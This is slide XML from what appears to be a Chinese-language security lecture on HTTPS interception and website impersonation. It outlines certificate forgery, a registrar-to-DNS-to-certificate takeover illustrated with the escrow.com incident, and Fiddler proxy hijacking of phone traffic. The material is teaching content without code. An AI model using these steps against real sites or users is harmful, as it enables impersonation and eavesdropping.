      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="内容占位符 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="784936" y="1396508"/>
            <a:ext cx="7772400" cy="968320"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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999067" y="1388534"/>
            <a:ext cx="7382933" cy="4724400"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000" dirty="0"/>
              <a:t>用自签名证书伪造知名网站证书</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="40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z="4000" dirty="0"/>
              <a:t>用自签名证书伪造知名网站证书</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4000"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026237" y="1405467"/>
            <a:ext cx="6729230" cy="4673600"/>
          </a:xfr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2188" y="1437785"/>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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1156538" y="3495185"/>
            <a:ext cx="6743700" cy="2419350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1077999" y="1338033"/>
            <a:ext cx="7319963" cy="4979640"/>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5562" y="1338033"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击目标网站域名注册服务提供商 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>修改目标网站域名记录 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>申请网站证书 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>伪装成目标网站</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="991478" y="1134850"/>
            <a:ext cx="7349923" cy="3590579"/>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0051" y="5090883"/>
            <a:ext cx="6991350" cy="723900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="下箭头 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4655220" y="4666501"/>
            <a:ext cx="381015" cy="524221"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF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rgbClr val="FF0000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799715" y="5814783"/>
            <a:ext cx="8092021" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>通过查看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>escrow.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>的域名系统（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>）记录，发现指向的是马来西亚的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>地址：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>111.90.149.49</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18"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09183" y="1221655"/>
            <a:ext cx="8169303" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击者还从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Let’s Encrypt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>获得了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>escrow.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的免费加密证书。题外话，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Let’s Encrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>证书已经被黑客用的极度泛滥了</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>组合攻击实现网站假冒</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="509183" y="2974918"/>
            <a:ext cx="8179724" cy="3883082"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="内容占位符 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1144329"/>
            <a:ext cx="7772400" cy="1319666"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>启动代理服务器，浏览器配置代理服务器上网，在代理服务器上劫持、监听</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1390099" y="2878397"/>
            <a:ext cx="5600700" cy="3581400"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="内容占位符 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1144328"/>
            <a:ext cx="7772400" cy="5107181"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>启动代理服务器，浏览器配置代理服务器上网，在代理服务器上劫持、监听</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="图片 1"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1150938" y="2724538"/>
            <a:ext cx="6313552" cy="3396342"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF000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772400" cy="547348"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Fiddler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持手机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>流量为例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1628955" y="2296742"/>
            <a:ext cx="666459" cy="1109548"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3701507" y="3183391"/>
            <a:ext cx="1457325" cy="1209675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="图片 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6393679" y="2703482"/>
            <a:ext cx="1581150" cy="895350"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="图片 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7129936" y="4367476"/>
            <a:ext cx="844893" cy="1328563"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="直接箭头连接符 11"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="4" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2295414" y="2851516"/>
            <a:ext cx="1505083" cy="936713"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="直接箭头连接符 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5059841" y="3319872"/>
            <a:ext cx="1486238" cy="620757"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="直接箭头连接符 19"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="10" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7184254" y="3533459"/>
            <a:ext cx="368129" cy="834017"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="triangle" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本框 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1521955" y="3444517"/>
            <a:ext cx="800219" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>手机</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="文本框 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2202970" y="4424787"/>
            <a:ext cx="4564583" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>笔记本电脑</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>（启动</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Fiddler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>，开启</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Wi-Fi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>热点）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="文本框 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6767552" y="5719065"/>
            <a:ext cx="1663661" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>服务器</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>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494790" y="1572825"/>
            <a:ext cx="5951157" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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566601" y="1554163"/>
            <a:ext cx="5956824" cy="4114800"/>
          </a:xfr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701292" y="1554163"/>
            <a:ext cx="5687442" cy="4114800"/>
          </a:xfrm>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114726" y="1554163"/>
            <a:ext cx="4860574" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>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0" y="1284398"/>
